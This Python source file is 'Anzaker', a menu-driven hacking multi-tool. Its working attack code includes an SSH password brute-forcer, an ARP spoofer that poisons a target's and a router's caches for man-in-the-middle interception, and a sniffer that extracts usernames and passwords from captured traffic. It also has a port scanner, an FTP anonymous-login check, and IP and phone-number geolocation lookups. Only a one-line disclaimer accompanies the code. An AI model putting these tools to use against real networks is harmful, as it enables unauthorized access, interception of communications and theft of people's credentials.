# ╔═╗┌┐┌┌─┐┌─┐┬┌─┌─┐┬─┐
# ╠═╣│││┌─┘├─┤├┴┐├┤ ├┬┘
# ╩ ╩┘└┘└─┘┴ ┴┴ ┴└─┘┴└─
#
# Anzaker (Hacking Multi-Tool) made by Anz
# Github: https://github.com/Anz1x
#
# Read README.md for more information
#
# DISCLAIMER: I am not responsible with your illegal intentions with this so please don't use this on someone explicitly without their permission.
#
# I will keep updating this tool so I will always be fixing any bugs and adding new tools here etc.

# Modules
from scapy.all import *
from IPy import IP
from urllib import parse
from colorama import Fore
from datetime import datetime
from time import sleep
from phonenumbers import geocoder, carrier, timezone
from phonenumbers.phonenumberutil import number_type
from opencage import geocoder as geolocator
from opencage.geocoder import OpenCageGeocode

import socket
import os
import time
import logging
import colorama
import re
import queue
import paramiko
import threading
import requests
import json
import ports
import sys
import ftplib
import phonenumbers
import scapy.all as scapy

now = datetime.now()

colorama.init(autoreset=True)

logging.basicConfig(level=logging.INFO, format="%(message)s [%(asctime)s]", 
                        datefmt=now.strftime("%a, %d-%b-%Y %H:%M"))

clear = lambda: os.system("cls" if os.name== "nt" else "clear")

# The Header
def header():

    clear()

    print(Fore.RED + """
                   :^^::::.                  
                  ~!^....:^~^                
                 !7:......:~J!               
                ^7^........:!Y^              
               .!!^.........^7?.             
               77~:.........:^:~.            
              ^?~...    ...::..^~            
             :7^             ..:~~           
           .:.                  ..          
        .:^^                    .:          
      :^^:::..                  .:~^:..      
    .~^:.......                ......::~:    
    .^~..  ... .                 .... ..^!.   
    ...:    .                     .      ::..  
   .                                   .. .^ 
 .                                        !.
 .                                         ~^
 .                                         :^
 .                                         .~ """ + Fore.LIGHTGREEN_EX + """

            ╔═╗┌┐┌┌─┐┌─┐┬┌─┌─┐┬─┐
            ╠═╣│││┌─┘├─┤├┴┐├┤ ├┬┘
            ╩ ╩┘└┘└─┘┴ ┴┴ ┴└─┘┴└─   

""" + Fore.RED + """[>]""" + Fore.LIGHTGREEN_EX + """ Anzaker (Hacking multi-tool) made by Anz
""" + Fore.RED + """[>]""" + Fore.LIGHTGREEN_EX + """ Github: https://github.com/Anz1x """ + Fore.RESET + """
________________________________________________________________
    """)

    print(Fore.RED + """[1] """ + Fore.LIGHTGREEN_EX + """Port Scanner """ + Fore.RED + """                 [6] """ + Fore.LIGHTGREEN_EX + """Arp Spoofer
""" + Fore.RED + """[2] """ + Fore.LIGHTGREEN_EX + """SSH Bruteforce (BUGGY) """ + Fore.RED + """       [7] """ + Fore.LIGHTGREEN_EX + """Password Sniffer
""" + Fore.RED + """[3] """ + Fore.LIGHTGREEN_EX + """Vulnerability Scanner """ + Fore.RED + """        [8] """ + Fore.LIGHTGREEN_EX + """Get Info of a Phone Number
""" + Fore.RED + """[4] """ + Fore.LIGHTGREEN_EX + """FTP Anonymous Login """ + Fore.RED + """          [9] """ + Fore.LIGHTGREEN_EX + """Credits      
""" + Fore.RED + """[5] """ + Fore.LIGHTGREEN_EX + """Get Info of an IP Address """ + Fore.RED + """    [q] """ + Fore.LIGHTGREEN_EX + """Exit the program"""
)

    print("________________________________________________________________\n")

    response = input(Fore.GREEN + "[>>>] " + Fore.RED)

    if response == "1":
        portscanner()

    if response == "2":
        sshbruteforce()

    if response == "3":
        vulnerability_scanner()

    if response == "4":
        ftp_anon()

    if response == "5":
        ip_scanner()

    if response == "6":
        arp_spoofer()

    if response == "7":
        password_sniffer()
    
    if response == "8":
        phonenumber_scanner()

    if response == "9":
        credits()

    if response == "exit":

        clear()

        sys.exit(0)

    elif response == "q":

        clear()

        sys.exit(0)

    else:
        clear()

        print(Fore.RED + "[-]" + Fore.LIGHTGREEN_EX + " Invalid choice!")
        sleep(1)
        exit = str(input("\n" + Fore.GREEN + "[>] " + Fore.RESET + "Press Enter to exit: "))

        if exit == "":
            header()


# Port Scanner
def portscanner():

    clear()


    print(Fore.GREEN + """


╔═╗┌─┐┬─┐┌┬┐  ╔═╗┌─┐┌─┐┌┐┌┌┐┌┌─┐┬─┐
╠═╝│ │├┬┘ │   ╚═╗│  ├─┤││││││├┤ ├┬┘
╩  └─┘┴└─ ┴   ╚═╝└─┘┴ ┴┘└┘┘└┘└─┘┴└─

    """ + Fore.RESET + """
========================================================""")

    colorama.init(autoreset=True)
    date = datetime.now()
    q = queue.Queue()
    lock = threading.Lock()
    port_list = []

    # grabbing the banner
    def grab_banner(s):
        return s.recv(1024)

    # scanning the host for ports
    def port_scan(host, port):
        try:
            s = socket.socket(socket.AF_INET)
            s.settimeout(0.5)          
            connection = s.connect((host, port))

            try:
                banner = grab_banner(s)

                with lock:
                    print(f"{Fore.GREEN}[+]{Fore.RESET} Open Port: %s : %s" % (port, banner.decode().strip("\n")))
                    port_list.append(port)

                connection.close()

            except:

                with lock:
                    print(f"{Fore.GREEN}[+]{Fore.RESET} Open Port: %s" % (port))
                    port_list.append(port)

                connection.close()
        except:
            pass

    # threading, h = host
    def thread(h): # h = host
        while True:
            port_to_scan = q.get()
            port_scan(h, port_to_scan)
            q.task_done()

    # main function
    def main():
        target = input(f"{Fore.LIGHTYELLOW_EX}[+]{Fore.RESET} Target (e.g. google.com, 192.168.1.1): ")
        num_ports = int(input(f"{Fore.LIGHTYELLOW_EX}[+]{Fore.RESET} Max Port Range (e.g. 1024): "))
        num_threads = int(input(f"{Fore.LIGHTYELLOW_EX}[+]{Fore.RESET} Threads (100-200 recommended): "))

        try:
          host = socket.gethostbyname(target)
        except socket.gaierror:
          print("--------------------------------------------------------")
          print(f"{Fore.LIGHTRED_EX}[-]{Fore.RESET} Host not found")
          print("--------------------------------------------------------")
          sys.exit(1)
        
        print("--------------------------------------------------------")
        print(f"{Fore.LIGHTYELLOW_EX}[+]{Fore.RESET} Scanning {target} at %s" % (date.strftime("%Y-%m-%d %H:%M")))
        print(f"{Fore.LIGHTYELLOW_EX}[>]{Fore.RESET} Press CTRL+C to cancel the program")
        print("--------------------------------------------------------")

        start_duration = time.time()

        for x in range(num_threads):
            t = threading.Thread(target=thread, args=(host,))
            t.daemon = True

            t.start()

        for ports in range(1, num_ports):
            q.put(ports)

        q.join()

        duration = float("%0.2f" % (time.time() - start_duration))

        print("--------------------------------------------------------")
        print(f"{Fore.LIGHTYELLOW_EX}[+]{Fore.RESET} Scanning {Fore.LIGHTYELLOW_EX+target+Fore.RESET} completed at %s" % (date.strftime("%Y-%m-%d %H:%M")))
        print(f"{Fore.LIGHTYELLOW_EX}[>]{Fore.RESET} Total duration: {duration}s")
        print(f"{Fore.LIGHTYELLOW_EX}[>]{Fore.RESET} {len(port_list)} open port(s) found")
        print("--------------------------------------------------------")
        time.sleep(1)
        results = input(f"{Fore.LIGHTYELLOW_EX}[+]{Fore.RESET} Write the port scan results to a file(y/n)?: ")
        if results == "n":
            print("========================================================")
        elif results == "y":
            file = input(f"{Fore.LIGHTYELLOW_EX}[+]{Fore.RESET} File name (<file>.txt): ")   
            with open(file, "w") as f:
                f.write(f"""Target: {target}
    Threads used: {num_threads}
    Ports scanned: 1-{num_ports}
    Scan duration: {duration}

    Open ports: {port_list}
    """)
            print(f"{Fore.LIGHTYELLOW_EX}[+]{Fore.RESET} Wrote the results in {Fore.LIGHTYELLOW_EX+file}")
            print("========================================================")

        else:
            pass
            print("========================================================")

    if __name__ == "__main__":
        try:
            main()
        except KeyboardInterrupt:
            print(f"\n{Fore.LIGHTRED_EX}[-]{Fore.RESET} Program stopped")
            sleep(1)
            exit = str(input("\n" + Fore.GREEN + "[>] " + Fore.RESET + "Press Enter to exit: "))



        sleep(1)
        exit = str(input("\n" + Fore.GREEN + "[>] " + Fore.RESET + "Press Enter to exit: "))

        if exit == "":
            header()

# SSH Bruteforce
def sshbruteforce():
    
    clear()

    stop_flag = 0

    def ssh_connect(password):
        global stop_flag
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
        try:
            ssh.connect(target, port=22, username=username, password=password)
            stop_flag = 1
            print(Fore.GREEN + "[+] Password found: %s | For Account: %s" % (password, username))
        except:
            print(Fore.RED + "[-] Incorrect credentials: %s" % (password))

        ssh.close()

    print(Fore.BLUE + """"
░██████╗░██████╗██╗░░██╗  ██████╗░██████╗░██╗░░░██╗████████╗███████╗  ███████╗░█████╗░██████╗░░█████╗░███████╗
██╔════╝██╔════╝██║░░██║  ██╔══██╗██╔══██╗██║░░░██║╚══██╔══╝██╔════╝  ██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝
╚█████╗░╚█████╗░███████║  ██████╦╝██████╔╝██║░░░██║░░░██║░░░█████╗░░  █████╗░░██║░░██║██████╔╝██║░░╚═╝█████╗░░
░╚═══██╗░╚═══██╗██╔══██║  ██╔══██╗██╔══██╗██║░░░██║░░░██║░░░██╔══╝░░  ██╔══╝░░██║░░██║██╔══██╗██║░░██╗██╔══╝░░
██████╔╝██████╔╝██║░░██║  ██████╦╝██║░░██║╚██████╔╝░░░██║░░░███████╗  ██║░░░░░╚█████╔╝██║░░██║╚█████╔╝███████╗
╚═════╝░╚═════╝░╚═╝░░╚═╝  ╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚══════╝  ╚═╝░░░░░░╚════╝░╚═╝░░╚═╝░╚════╝░╚══════╝     """ + Fore.RESET + """
_______________________________________________________________________________________________________________
    """)

    sleep(0.1)
    target = str(input(Fore.YELLOW + "[+] Target: " + Fore.RESET))
    username = str(input(Fore.YELLOW + "[+] SSH Username: " + Fore.RESET))
    file = str(input(Fore.YELLOW + "[+] Path to wordlist file: " + Fore.GREEN))
    print("\n")

    if os.path.exists(file) == False:
        print(Fore.RED + "[-] Unable to locate the file/path")      
        sleep(1)
        exit = str(input("\n" + Fore.GREEN + "[>] " + Fore.RESET + "Press Enter to exit: "))

        if exit == "":
            header()
    else:
        print(Fore.GREEN + "Starting the SSH brute force attack at %s" % (target))

        try:
            pass
        except EOFError as err:
            pass

        with open(file, "r") as file:
            for line in file.readlines():
                if stop_flag == 1:
                    t.join()
                    exit()
                password = line.strip()
                t = threading.Thread(target=ssh_connect, args=(password,))
                t.start()
                sleep(0.1)

        print("_________________________________________________________________________")
        print(Fore.GREEN + "\n[-] Brute force completed for %s" % (target))

        sleep(1)
        exit = str(input("\n" + Fore.GREEN + "[>] " + Fore.RESET + "Press Enter to exit: "))

        if exit == "":
            header()

# Vulnerability Scanner
def vulnerability_scanner():

    clear()

    print(Fore.CYAN + """
╔╗──╔╗─╔╗────   ╔═══╗
║╚╗╔╝║─║║────   ║╔═╗║
╚╗║║╔╣╔╣║╔═╗─   ║╚══╦══╦══╦═╗╔═╗╔══╦═╗
─║╚╝║║║║║║╔╗╗   ╚══╗║╔═╣╔╗║╔╗╣╔╗╣║═╣╔╝
─╚╗╔╣╚╝║╚╣║║║   ║╚═╝║╚═╣╔╗║║║║║║║║═╣║
──╚╝╚══╩═╩╝╚╝   ╚═══╩══╩╝╚╩╝╚╩╝╚╩══╩╝ """ + Fore.RESET + """                                                                                                                                                                               
_________________________________________________________________
    """)
    sleep(0.75)

    logging.basicConfig(level=logging.INFO, format="%(message)s" + Fore.YELLOW + "%(asctime)s", 
                        datefmt=time.strftime("%a, %d-%b-%Y %H:%M"))

    targets_address = str(input(Fore.GREEN + "[+] Target: " + Fore.RESET))
    port_range = int(input(Fore.GREEN + "[+] Port Range: " + Fore.RESET))
    logging.info("\nStarting the scan on %s at " % (targets_address))
    print("_________________________________________________________________")
    print("\n")


    target = ports.PortScan(targets_address, port_range)
    target.scan()

    try:
        with open("vuln_banners.txt", "r") as file:
                count = 0
                for banner in target.banners:
                    file.seek(0)
                    for line in file.readlines():
                        if line.strip() in banner:
                            print(Fore.YELLOW + "[-] VULNERABLE: "+ Fore.RED + banner + " on port " + str(target.open_ports[count]))
                            count += 1

    except:
        print("[-] Unable to open the file")       

    print("_________________________________________________________________")
    print(Fore.GREEN + "\n[-] %s vulnerabilitie(s) found" % (count))

    sleep(1)
    exit = str(input("\n" + Fore.GREEN + "[>] " + Fore.RESET + "Press Enter to exit: "))

    if exit == "":
        header()

# FTP Anonymous Login
def ftp_anon():

    clear()

    print(Fore.GREEN + """
███████╗████████╗██████╗      █████╗ ███╗   ██╗ ██████╗ ███╗   ██╗
██╔════╝╚══██╔══╝██╔══██╗    ██╔══██╗████╗  ██║██╔═══██╗████╗  ██║
█████╗     ██║   ██████╔╝    ███████║██╔██╗ ██║██║   ██║██╔██╗ ██║
██╔══╝     ██║   ██╔═══╝     ██╔══██║██║╚██╗██║██║   ██║██║╚██╗██║
██║        ██║   ██║         ██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║
╚═╝        ╚═╝   ╚═╝         ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝    """ + Fore.RESET + """                                                                                                                                                                               
_________________________________________________________________                                                                 
    """)

    def anon_login(host_name):
        try:
            ftp = ftplib.FTP(host_name)
            ftp.login("anonymous", "anonymous")
            print(Fore.GREEN + "[+] %s FTP Anonymous login was successful" % (host_name))
            ftp.quit()
            return True
        except Exception as err:
            print(Fore.RED + "[-] %s FTP Anonymous login failed" % (host_name))

    target = str(input(Fore.RED + "[+] Target: " + Fore.RESET))
    anon_login(target)

    sleep(1)
    exit = str(input("\n" + Fore.GREEN + "[>] " + Fore.RESET + "Press Enter to exit: "))

    if exit == "":
        header()

# IP Scanner
def ip_scanner():

    clear()

    print(Fore.YELLOW + """
▀█▀ ░█▀▀█ ── ▀█▀ █▀▀▄ █▀▀ █▀▀█ 
░█─ ░█▄▄█ ▀▀ ░█─ █──█ █▀▀ █──█ 
▄█▄ ░█─── ── ▄█▄ ▀──▀ ▀── ▀▀▀▀""" + Fore.RESET + """
__________________________________________
    """)

    url = "http://ip-api.com/json/"

    ip = str(input(Fore.LIGHTGREEN_EX + "[+] IP Address: " + Fore.RESET))
    print("\n")
    print(Fore.LIGHTGREEN_EX + "[+] " + Fore.RESET + "Collecting data...")
    sleep(1)

    target = f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,as,mobile,proxy"

    response = requests.get(target)

    target_info = response.json()

    dump_option = (str(input("""\n""" + Fore.LIGHTGREEN_EX + """[+] """ + Fore.RESET + """How do you want to receive the output?

"""+ Fore.RED + """[1] """+ Fore.LIGHTGREEN_EX + """Terminal
"""+ Fore.RED + """[2] """+ Fore.LIGHTGREEN_EX + """File

[>>>] """ + Fore.RED)))

    if dump_option == "1":
        if target_info["status"] == "success":
            print("\n" + Fore.LIGHTGREEN_EX + "[+] " + Fore.RESET + "Finished dumping the data for %s\n" % (Fore.LIGHTGREEN_EX + ip))
            print(Fore.YELLOW + "Status: " + Fore.GREEN + target_info["status"])
            print(Fore.YELLOW + "Country: "  + Fore.RESET + target_info["country"])
            print(Fore.YELLOW + "State/Region: " + Fore.RESET + target_info["regionName"])
            print(Fore.YELLOW + "City: " + Fore.RESET +target_info["city"])
            print(Fore.YELLOW + "Zip Code: " + Fore.RESET + target_info["zip"])
            print(Fore.YELLOW + "Latitude: " , target_info["lat"])
            print(Fore.YELLOW + "Longitude: " , target_info["lon"])
            print(Fore.YELLOW + "Timezone: " + Fore.RESET + target_info["timezone"])
            print(Fore.YELLOW + "Currency: " + Fore.RESET + target_info["currency"])
            print(Fore.YELLOW + "ISP/ORG: " + Fore.RESET + target_info["isp"])
            print(Fore.YELLOW + "Proxy: " , target_info["proxy"])
            print(Fore.YELLOW + "Mobile Cellular Connection: " , target_info["mobile"])

            sleep(1)
            exit = str(input("\n" + Fore.GREEN + "[>] " + Fore.RESET + "Press Enter to exit: "))

            if exit == "":
                header()
    

        else:
            print(Fore.RED + "[-] " + Fore.RESET + "Unable to get the data")

    if dump_option == "2":
        if target_info["status"] == "success":
            json.dump(target_info, open(f"{ip}_details.json", "w+"), indent=4)
            print("\n" + Fore.LIGHTGREEN_EX + "[+] " + Fore.RESET + "Finished dumping the data for %s" % (Fore.LIGHTGREEN_EX + ip))
            print(Fore.LIGHTGREEN_EX + "[+] " + Fore.RESET + "Dumped the data in "+ Fore.LIGHTGREEN_EX + ip + Fore.LIGHTGREEN_EX + "_details.json")

            sleep(1)
            exit = str(input("\n" + Fore.GREEN + "[>] " + Fore.RESET + "Press Enter to exit: "))

            if exit == "":
                header()

# Arp Spoofer
def arp_spoofer():
    
    clear()

    print(Fore.BLUE + """
╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╮
┃╭━╮┃╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱┃╭╯
┃┃╱┃┣━┳━━╮╭━━┳━━┳━━┳━━┳╯╰┳━━┳━╮
┃╰━╯┃╭┫╭╮┃┃━━┫╭╮┃╭╮┃╭╮┣╮╭┫┃━┫╭╯
┃╭━╮┃┃┃╰╯┃┣━━┃╰╯┃╰╯┃╰╯┃┃┃┃┃━┫┃
╰╯╱╰┻╯┃╭━╯╰━━┫╭━┻━━┻━━╯╰╯╰━━┻╯
╱╱╱╱╱╱┃┃╱╱╱╱╱┃┃
╱╱╱╱╱╱╰╯╱╱╱╱╱╰╯

""" + Fore.RED + """[>] """ + Fore.BLUE + """Press ctrl + c or ctrl + z if you want to stop spoofing the target""" + Fore.RESET + """   
______________________________________________________________________   
""")

    def get_mac_address(ip_address):
        broadcast_layer = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_layer = scapy.ARP(pdst=ip_address)
        get_mac_packet = broadcast_layer/arp_layer
        answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]
        return answer[0][1].hwsrc

    def spoof(router_ip, target_ip, router_mac, target_mac):
        packet_1 = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)
        packet_2 = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)

        scapy.send(packet_1)
        scapy.send(packet_2)



    target_ip = str(input(Fore.RED + "[+] Target IP: " + Fore.RESET))
    router_ip = str(input(Fore.RED + "[+] Router IP(Default Gateway): " + Fore.RESET))
    target_mac = str(get_mac_address(target_ip))
    router_mac = str(get_mac_address(router_ip))

    logging.info(Fore.YELLOW + "\nStarting the arp spoofer at")


    try:
        while True:
            spoof(router_ip, target_ip, router_mac, target_mac)
            sleep(2)
    except KeyboardInterrupt:
        print("\n")
        logging.info(Fore.YELLOW + "Stopped the arp spoofer at")
        sleep(1)
        exit = str(input("\n" + Fore.GREEN + "[>] " + Fore.RESET + "Press Enter to exit: "))

        if exit == "":
            header()

# Password Sniffer
def password_sniffer():
    
    clear()

    print(Fore.BLUE + """

 ___                              _   ___      _  __  __         
| _ \__ _ _______ __ _____ _ _ __| | / __|_ _ (_)/ _|/ _|___ _ _ 
|  _/ _` (_-<_-< V  V / _ \ '_/ _` | \__ \ ' \| |  _|  _/ -_) '_|
|_| \__,_/__/__/\_/\_/\___/_| \__,_| |___/_||_|_|_| |_| \___|_|  
                                                                  
                                                                  
""" + Fore.RED + """[>] """ + Fore.BLUE + """Press ctrl + c or ctrl + z if you want to stop sniffing passwords from the target
""" + Fore.RED + """[>] """ + Fore.BLUE + """NOTE: STILL WORKING ON THIS, READ README.md FOR MORE INFO """ + Fore.RESET + """   
______________________________________________________________________   
""")
    
    def credentials(body):

        username = None
        password = None

        userfields = ['log','login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                    'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                    'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                    'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                    'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
        passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword', 
                    'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword', 'login_password'
                    'passwort', 'passwrd', 'wppassword', 'upasswd','senha','contrasena']

        for user in userfields:
            user_re = re.search('(%s=[^&]+)' % user, body, re.IGNORECASE)
            if user_re:
                username = user_re.group()
                
        for passfield in passfields:
            password_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
            if password_re:
                password = password_re.group() 

        if username and password:
            return(username, password)

    def packet_parser(packet):
        if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
            body = str(packet[TCP].payload)
            username_password = credentials(body)
            if username_password != None:
                logging.info(packet[TCP].payload)
                logging.info(parse.unquote(Fore.GREEN + username_password[0]))
                logging.info(parse.unquote(Fore.GREEN + username_password[1]))
        else:
            pass

    try:
        iface = str(input(Fore.GREEN + "[+] Network Interface (Eth0/Wlan0/En0 etc): " + Fore.RESET))
    except:
        print(Fore.RED + "[-] Invalid network interface")

        sleep(1)
        exit = str(input("\n" + Fore.GREEN + "[>] " + Fore.RESET + "Press Enter to exit: "))

        if exit == "":
            header()

    logging.info(Fore.YELLOW + "Starting the Password Sniffer attack at")
    print("\n")

    try:
        sniff(iface=iface, prn=packet_parser, store=0)
    except KeyboardInterrupt:
        logging.info(Fore.RED + "\n[+] Exited the session")
        sleep(1)
        exit = str(input("\n" + Fore.GREEN + "[>] " + Fore.RESET + "Press Enter to exit: "))

        if exit == "":
            header()

# Phone number scanner
def phonenumber_scanner():

    clear()

    print(Fore.LIGHTYELLOW_EX + """
██████╗ ██╗  ██╗ ██████╗ ███╗   ██╗███████╗    ███╗   ██╗██╗   ██╗███╗   ███╗██████╗ ███████╗██████╗ 
██╔══██╗██║  ██║██╔═══██╗████╗  ██║██╔════╝    ████╗  ██║██║   ██║████╗ ████║██╔══██╗██╔════╝██╔══██╗
██████╔╝███████║██║   ██║██╔██╗ ██║█████╗      ██╔██╗ ██║██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
██╔═══╝ ██╔══██║██║   ██║██║╚██╗██║██╔══╝      ██║╚██╗██║██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
██║     ██║  ██║╚██████╔╝██║ ╚████║███████╗    ██║ ╚████║╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝ """ + Fore.RESET + """
_____________________________________________________________________________________________________                                                                                                               
    """)

    sleep(0.5)
    phone_num = str(input(Fore.LIGHTGREEN_EX + "[+] Phone Number: " + Fore.RESET))
    if "" in phone_num:
                phone_num.strip("")
    phonenumber_response = str(input(Fore.LIGHTGREEN_EX + "\n[+] Do you want to get the info using an API key " + Fore.RESET + "(y/n)" + Fore.LIGHTGREEN_EX + "?: " + Fore.RESET))

    if phonenumber_response == "n":
        phone_number = phonenumbers.parse(phone_num, "CH")

        location = geocoder.description_for_number(phone_number, "en")
        phone_carrier = carrier.name_for_number(phone_number, "en")
        time = timezone.time_zones_for_geographical_number(phone_number)
        phone_number_type = number_type(phone_number)

        if phone_number_type == 1:
            phone_number_type = "Mobile"
        if phone_number_type == 0:
            phone_number_type = "Land line"
        if phone_number_type == 2:
            phone_number_type = "Mobile or Land line"

        print(Fore.LIGHTGREEN_EX + "\n[+] " + Fore.RESET + "Collecting data...")
        sleep(1)

        print("\n")
        print(f"{phone_number}")
        print(Fore.LIGHTGREEN_EX + f"Country: {Fore.RESET + location}")
        print(Fore.LIGHTGREEN_EX + f"Carrier: {Fore.RESET + phone_carrier}")
        print(Fore.LIGHTGREEN_EX + f"Timezone: " + Fore.RESET + f"{time}")
        print(Fore.LIGHTGREEN_EX + f"Phone number type: {Fore.RESET + phone_number_type}")

        sleep(1)
        exit = str(input("\n" + Fore.GREEN + "[>] " + Fore.RESET + "Press Enter to exit: "))

        if exit == "":
            header()

    elif phonenumber_response == "y":
        phone_number = phonenumbers.parse(phone_num, "CH")

        location = geocoder.description_for_number(phone_number, "en")
        phone_carrier = carrier.name_for_number(phone_number, "en")
        time = timezone.time_zones_for_geographical_number(phone_number)
        phone_number_type = number_type(phone_number)

        if phone_number_type == 1:
            phone_number_type = "Mobile"
        if phone_number_type == 0:
            phone_number_type = "Land line"
        if phone_number_type == 2:
            phone_number_type = "Mobile or Land line"

        print(Fore.LIGHTGREEN_EX + "\n[+]" + Fore.RESET + " Make an account for free at " + Fore.LIGHTGREEN_EX + "https://opencagedata.com/" + Fore.RESET + " if you don't have one and then copy and paste your API Key")
        sleep(1)
        api_key = str(input(Fore.LIGHTGREEN_EX + "[+] API Key: " + Fore.RESET))
        
        geolocator = OpenCageGeocode(api_key)
        query = str(location)
        results = geolocator.geocode(query)

        print(Fore.LIGHTGREEN_EX + "\n[+] " + Fore.RESET + "Collecting data...")
        sleep(1)

        print("\n")
        print(f"{phone_number}")
        print(Fore.LIGHTGREEN_EX + f"Country: {Fore.RESET + location}")
        print(Fore.LIGHTGREEN_EX + f"Carrier: {Fore.RESET + phone_carrier}")
        print(Fore.LIGHTGREEN_EX + f"Timezone: " + Fore.RESET + f"{time}")
        print(Fore.LIGHTGREEN_EX + f"Phone number type: {Fore.RESET + phone_number_type}")

        try:
            lat = results[0]["geometry"]["lat"]
            lng = results[0]["geometry"]["lng"]

            coordinates = lat,lng
            print(Fore.LIGHTGREEN_EX + f"Coordinates: " + Fore.RESET + f"{coordinates}")
        except:
            print("Coordinates: Unable to get the coordinates")

        sleep(1)
        exit = str(input("\n" + Fore.GREEN + "[>] " + Fore.RESET + "Press Enter to exit: "))

        if exit == "":
            header()
    else:

        print(Fore.RED + "\n[-]" + Fore.LIGHTGREEN_EX + " Invalid choice!")

        sleep(1)
        exit = str(input("\n" + Fore.GREEN + "[>] " + Fore.RESET + "Press Enter to exit: "))

        if exit == "":
            header()

# Credits
def credits():

    clear()

    print(Fore.LIGHTGREEN_EX + """
╔═╗┌┐┌┌─┐┌─┐┬┌─┌─┐┬─┐
╠═╣│││┌─┘├─┤├┴┐├┤ ├┬┘
╩ ╩┘└┘└─┘┴ ┴┴ ┴└─┘┴└─

Anzaker is a hacking multi tool made by Anz! I will keep updating this tool so I will always be fixing any bugs and adding new tools here etc.

DISCLAIMER: I am not responsible with your illegal intentions with this so please don't use this on someone explicitly without their permission.

Github: github.com/anz1x
    """)

    sleep(1)
    exit = str(input("\n" + Fore.GREEN + "[>] " + Fore.RESET + "Press Enter to exit: "))

    if exit == "":
        header()

header()
